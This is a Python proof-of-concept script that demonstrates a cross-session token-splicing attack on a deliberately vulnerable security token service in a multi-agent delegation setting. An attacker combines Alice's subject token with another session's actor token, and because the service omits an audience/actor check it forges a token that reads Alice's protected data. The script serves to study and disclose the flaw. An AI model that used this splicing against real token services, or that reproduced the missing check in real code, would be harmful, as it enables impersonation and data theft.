from sts.vulnerable_sts import VulnerableSTS
from agent import Agent
from utils.token_utils import verify_token
from utils.logging import log, SESSION1, SESSION2, ATTACK, SUCCESS

PROTECTED_RESOURCES = {
    "alice": "alice_secret_data",
    "bob":   "bob_secret_data",
}

def access_resource(token, requester):
    claims = verify_token(token)
    if claims["act"]["sub"] != requester:
        return f"DENIED: act.sub = {claims['act']['sub']}, expected = {requester}, not matching!"
    return f"GRANTED: {PROTECTED_RESOURCES.get(claims['sub'])} as requester == act.sub"

# Shared STS instance, all agents call the same token service
sts = VulnerableSTS()
agent_a = Agent("agent-a")
agent_b = Agent("agent-b")
agent_c = Agent("agent-c")
agent_d = Agent("agent-d")

# Session 1: Alice authorises Agent A, Agent A delegates to B
log("Session 1: Alice authorises Agent A, Agent A delegates to Agent B", SESSION1)
agent_a.receive_token(sts.initial_grant("alice", "agent-a", ["A", "B", "C"]))
c = verify_token(agent_a.token)
log(f"STS issues token: sub = {c['sub']}, aud = {c['aud']}, scope = {c['scope']}", SESSION1)

agent_b.receive_token(agent_a.delegate_to(sts, "agent-b", ["A"]))
b = verify_token(agent_b.token)
log(f"STS issues token: sub = {b['sub']}, aud = {b['aud']}, scope = {b['scope']}", SESSION1)

print()

# Session 2: Bob authorises Agent C, Agent C delegates to D
log("Session 2: Bob authorises Agent C, Agent C delegates to Agent D", SESSION2)
agent_c.receive_token(sts.initial_grant("bob", "agent-c", ["B", "C", "D"]))
c2 = verify_token(agent_c.token)
log(f"STS issues token: sub = {c2['sub']}, aud = {c2['aud']}, scope = {c2['scope']}", SESSION2)

agent_d.receive_token(agent_c.delegate_to(sts, "agent-d", ["B"]))
d = verify_token(agent_d.token)
log(f"STS issues token: sub = {d['sub']}, aud = {d['aud']}, scope = {d['scope']}", SESSION2)

print()

# Attacker has stolen one token from each session, neither is usable directly
# claims["act"]["sub"] does not match requester
log("Attacker intercepts one token from each session:", ATTACK)
log(f"  agent_b.token: sub = {b['sub']}, aud = {b['aud']}, scope = {b['scope']}", ATTACK)
log(f"  agent_d.token: sub = {d['sub']}, aud = {d['aud']}, scope = {d['scope']}", ATTACK)

print()

# Direct use fails, attacker authenticates as themselves but is not the named actor on either token
log("Attacker attempts direct access as 'attacker' with stolen tokens:", ATTACK)
log(f"  agent_b.token -> {access_resource(agent_b.token, 'attacker')}", ATTACK)
log(f"  agent_d.token -> {access_resource(agent_d.token, 'attacker')}", ATTACK)

print()

# Splice: pair alice's sub (Session 1) with agent-d's act chain (Session 2)
log("Attacker splices sub from Session 1 with act chain from Session 2:", ATTACK)
log(f"  subject_token == agent_b.token: aud = {b['aud']}", ATTACK)
log(f"  actor_token   == agent_d.token: act.sub = {d['act']['sub']}", ATTACK)

print()

# The STS validates each token's signature independently, both are legitimate tokens from real sessions
# It never checks that subject_token.aud == actor_token.act.sub, so the cross-session splice goes undetected
forged_token = sts.exchange(
    agent_b.token,
    agent_d.token,
    "attacker",
    ["A", "B", "C"],
)

f = verify_token(forged_token)
log("Vulnerable STS issued token", SUCCESS)
log(f"  sub   = {f['sub']}", SUCCESS)
log(f"  aud   = {f['aud']}", SUCCESS)
log(f"  act   = {f['act']}", SUCCESS)
log(f"  scope = {f['scope']}", SUCCESS)

print()

# Attacker uses the forged token to access Alice's resource as if they were a legitimate actor
log("Attacker accesses Alice's protected resource using forged token:", SUCCESS)
log(f"  {access_resource(forged_token, 'attacker')}", SUCCESS)